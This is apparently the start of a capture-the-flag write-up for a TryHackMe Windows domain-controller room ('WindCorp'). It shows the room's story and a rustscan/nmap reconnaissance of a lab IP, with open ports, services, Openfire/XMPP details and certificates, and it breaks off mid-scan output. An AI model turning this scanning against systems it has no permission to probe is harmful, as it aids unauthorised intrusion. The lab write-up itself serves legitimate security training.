You have found WindCorp's internal network and their Domain Controller. Can you pwn their network?

![](https://i.imgur.com/eyf66N3.png)

![|333](https://tryhackme-images.s3.amazonaws.com/room-icons/f8cc5f48d1b4cf162c24c6964dfe0718.jpeg)

Story

You have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable (ha! so much for that claim!).

Next step would be to take their crown jewels and get full access to their internal network. You have spotted a new windows machine that may lead you to your end goal. Can you conquer this end boss and own their internal network?

Happy Hacking! 

@4nqr34z and @theart42

(Give it at least 5 minutes to boot)

```

┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.181.243 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.181.243:53
Open 10.10.181.243:80
Open 10.10.181.243:88
Open 10.10.181.243:135
Open 10.10.181.243:139
Open 10.10.181.243:389
Open 10.10.181.243:445
Open 10.10.181.243:464
Open 10.10.181.243:593
Open 10.10.181.243:636
Open 10.10.181.243:2179
Open 10.10.181.243:3269
Open 10.10.181.243:3268
Open 10.10.181.243:5222
Open 10.10.181.243:5223
Open 10.10.181.243:5229
Open 10.10.181.243:5263
Open 10.10.181.243:5262
Open 10.10.181.243:5269
Open 10.10.181.243:5270
Open 10.10.181.243:5275
Open 10.10.181.243:5276
Open 10.10.181.243:3389
Open 10.10.181.243:7070
Open 10.10.181.243:7443
Open 10.10.181.243:7777
Open 10.10.181.243:9090
Open 10.10.181.243:9091
Open 10.10.181.243:9389
Open 10.10.181.243:49670
Open 10.10.181.243:49674
Open 10.10.181.243:49675
Open 10.10.181.243:49676
Open 10.10.181.243:49744
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-10 23:57 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:58
Completed NSE at 23:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:58
Completed NSE at 23:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:58
Completed NSE at 23:58, 0.00s elapsed
Initiating Ping Scan at 23:58
Scanning 10.10.181.243 [2 ports]
Completed Ping Scan at 23:58, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:58
Completed Parallel DNS resolution of 1 host. at 23:58, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 23:58
Scanning 10.10.181.243 [34 ports]
Discovered open port 3389/tcp on 10.10.181.243
Discovered open port 135/tcp on 10.10.181.243
Discovered open port 7443/tcp on 10.10.181.243
Discovered open port 139/tcp on 10.10.181.243
Discovered open port 53/tcp on 10.10.181.243
Discovered open port 80/tcp on 10.10.181.243
Discovered open port 445/tcp on 10.10.181.243
Discovered open port 88/tcp on 10.10.181.243
Discovered open port 5222/tcp on 10.10.181.243
Discovered open port 636/tcp on 10.10.181.243
Discovered open port 389/tcp on 10.10.181.243
Discovered open port 49676/tcp on 10.10.181.243
Discovered open port 3269/tcp on 10.10.181.243
Discovered open port 49675/tcp on 10.10.181.243
Discovered open port 49670/tcp on 10.10.181.243
Discovered open port 7070/tcp on 10.10.181.243
Discovered open port 7777/tcp on 10.10.181.243
Discovered open port 5270/tcp on 10.10.181.243
Discovered open port 9090/tcp on 10.10.181.243
Discovered open port 3268/tcp on 10.10.181.243
Discovered open port 9091/tcp on 10.10.181.243
Discovered open port 49744/tcp on 10.10.181.243
Discovered open port 2179/tcp on 10.10.181.243
Discovered open port 5275/tcp on 10.10.181.243
Discovered open port 5276/tcp on 10.10.181.243
Discovered open port 5269/tcp on 10.10.181.243
Discovered open port 5263/tcp on 10.10.181.243
Discovered open port 49674/tcp on 10.10.181.243
Discovered open port 5229/tcp on 10.10.181.243
Discovered open port 5223/tcp on 10.10.181.243
Discovered open port 9389/tcp on 10.10.181.243
Discovered open port 5262/tcp on 10.10.181.243
Discovered open port 593/tcp on 10.10.181.243
Discovered open port 464/tcp on 10.10.181.243
Completed Connect Scan at 23:58, 0.59s elapsed (34 total ports)
Initiating Service scan at 23:58
Scanning 34 services on 10.10.181.243
Completed Service scan at 23:59, 75.53s elapsed (34 services on 1 host)
NSE: Script scanning 10.10.181.243.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:59
NSE Timing: About 99.98% done; ETC: 23:59 (0:00:00 remaining)
Completed NSE at 00:00, 48.11s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:00
Completed NSE at 00:00, 15.12s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:00
Completed NSE at 00:00, 0.00s elapsed
Nmap scan report for 10.10.181.243
Host is up, received syn-ack (0.19s latency).
Scanned at 2022-11-10 23:58:00 EST for 140s

PORT      STATE SERVICE             REASON  VERSION
53/tcp    open  domain              syn-ack Simple DNS Plus
80/tcp    open  http                syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Windcorp.
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec        syn-ack Microsoft Windows Kerberos (server time: 2022-11-11 04:58:07Z)
135/tcp   open  msrpc               syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn         syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap                syn-ack Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?       syn-ack
464/tcp   open  kpasswd5?           syn-ack
593/tcp   open  ncacn_http          syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped          syn-ack
2179/tcp  open  vmrdp?              syn-ack
3268/tcp  open  ldap                syn-ack Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped          syn-ack
3389/tcp  open  ms-wbt-server       syn-ack Microsoft Terminal Services
|_ssl-date: 2022-11-11T05:00:06+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2022-11-11T04:59:22+00:00
| ssl-cert: Subject: commonName=Fire.windcorp.thm
| Issuer: commonName=Fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-10T04:57:26
| Not valid after:  2023-05-12T04:57:26
| MD5:   d02273d5759254452f97ba86e8e8b9d5
| SHA-1: 5c8e941c1ba3a58b23de34a7e4150358bfb899de
| -----BEGIN CERTIFICATE-----
| MIIC5jCCAc6gAwIBAgIQJ8yi/yqmtZpB8xFyQ1xT5DANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDExFGaXJlLndpbmRjb3JwLnRobTAeFw0yMjExMTAwNDU3MjZaFw0y
| MzA1MTIwNDU3MjZaMBwxGjAYBgNVBAMTEUZpcmUud2luZGNvcnAudGhtMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyd9RGA4CF7NFWAgDc4CmOifl5msy
| EToX1hdkb+I1syZS0vivCGaqMzSx3t9ahbEaWWS+cYdgnLooOLex9KYvVCPLLzD2
| 0uE9IgZIYDO+nqm48Japa4PqBbs83lmgLME3GjEmI8jHofaEDTkQ69vewBR7iT5w
| QD7PD+v4s5Gl8G7fwcOmgedSgA4xr2FUW7AsdYmVjvIBwDQjpAIhi0IfLVEisi3Z
| UnDXa+A4R8CtskQKogaREE1Vnlfl8JPUSMd4vR4GbM31RvjwK+/d74k7b75A0Tl/
| 3aDeUfZJu+cOtaW3YFjsyfnL2XXCyW8PnOm21nR7LN4kjDsQFtfCnF1xaQIDAQAB
| oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN
| AQELBQADggEBAE5HJhCKWreAOPEXulK+BY0nrGrU+jlr4kWNyBJCg+D0C1fjOq6w
| QTVn6SXd9f26RMsjs7cJ1QqXZyCECJzOVCt0I0TUjsfFACYzMKK3DI2Af70tqjb7
| l8LY1yeY8WAHwVMXNJps1YYm7cWmiN/HhfSHDngfLM5dGG2JxPluZjUieccUgFrL
| HRkYbcVRj1MzP2DDyp8tKJU76HH57rjqUKnb9CVtaYcwq6UVq/bCio1SN6iyfb+I
| feO0IlZIhUKbNtL8pNuOdditYC+MnYSCfX4+MFI4tJdKfTCQGaRBtJxotvTsY6iK
| +W3SbhXgvpEkt9lA5L8jspZRZoNNBkJtpT8=
|_-----END CERTIFICATE-----
5222/tcp  open  jabber              syn-ack
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     auth_mechanisms: 
|     capabilities: 
|     xmpp: 
|       version: 1.0
|     stream_id: 32p2034xhh
|     features: 
|_    compression_methods: 
|_ssl-date: 2022-11-11T05:00:05+00:00; -1s from scanner time.
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715542583f3a20f75c8ca2d3353cbb7
| SHA-1: 97f70772a26be3247ed5bbcb5f357d74798266ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
5223/tcp  open  ssl/jabber          syn-ack
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715542583f3a20f75c8ca2d3353cbb7
| SHA-1: 97f70772a26be3247ed5bbcb5f357d74798266ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
|_ssl-date: 2022-11-11T05:00:05+00:00; -1s from scanner time.
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     errors: 
|       (timeout)
|     auth_mechanisms: 
|     capabilities: 
|     xmpp: 
|     features: 
|_    compression_methods: 
5229/tcp  open  jaxflow?            syn-ack
5262/tcp  open  jabber              syn-ack
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     auth_mechanisms: 
|     capabilities: 
|     xmpp: 
|       version: 1.0
|     stream_id: a2i6vozifr
|     features: 
|_    compression_methods: 
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5263/tcp  open  ssl/jabber          syn-ack
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     errors: 
|       (timeout)
|     auth_mechanisms: 
|     capabilities: 
|     xmpp: 
|     features: 
|_    compression_methods: 
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
|_ssl-date: 2022-11-11T05:00:05+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715542583f3a20f75c8ca2d3353cbb7
| SHA-1: 97f70772a26be3247ed5bbcb5f357d74798266ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
5269/tcp  open  xmpp                syn-ack Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     errors: 
|       (timeout)
|     auth_mechanisms: 
|     capabilities: 
|     xmpp: 
|     features: 
|_    compression_methods: 
5270/tcp  open  ssl/xmpp            syn-ack Wildfire XMPP Client
|_ssl-date: 2022-11-11T05:00:05+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715542583f3a20f75c8ca2d3353cbb7
| SHA-1: 97f70772a26be3247ed5bbcb5f357d74798266ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
5275/tcp  open  jabber              syn-ack
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     auth_mechanisms: 
|     capabilities: 
|     xmpp: 
|       version: 1.0
|     stream_id: 5ncnsa3rv1
|     features: 
|_    compression_methods: 
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5276/tcp  open  ssl/jabber          syn-ack
|_ssl-date: 2022-11-11T05:00:05+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715542583f3a20f75c8ca2d3353cbb7
| SHA-1: 97f70772a26be3247ed5bbcb5f357d74798266ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     errors: 
|       (timeout)
|     auth_mechanisms: 
|     capabilities: 
|     xmpp: 
|     features: 
|_    compression_methods: 
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
7070/tcp  open  http                syn-ack Jetty 9.4.18.v20190429
|_http-title: Openfire HTTP Binding Service
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Jetty(9.4.18.v20190429)
7443/tcp  open  ssl/http            syn-ack Jetty 9.4.18.v20190429
|_http-server-header: Jetty(9.4.18.v20190429)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715542583f3a20f75c8ca2d3353cbb7
| SHA-1: 97f70772a26be3247ed5bbcb5f357d74798266ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: GET
7777/tcp  open  socks5              syn-ack (No authentication; connection not allowed by ruleset)
| socks-auth-info: 
|_  No authentication
9090/tcp  open  zeus-admin?         syn-ack
| fingerprint-strings: 
|   GetRequest: 
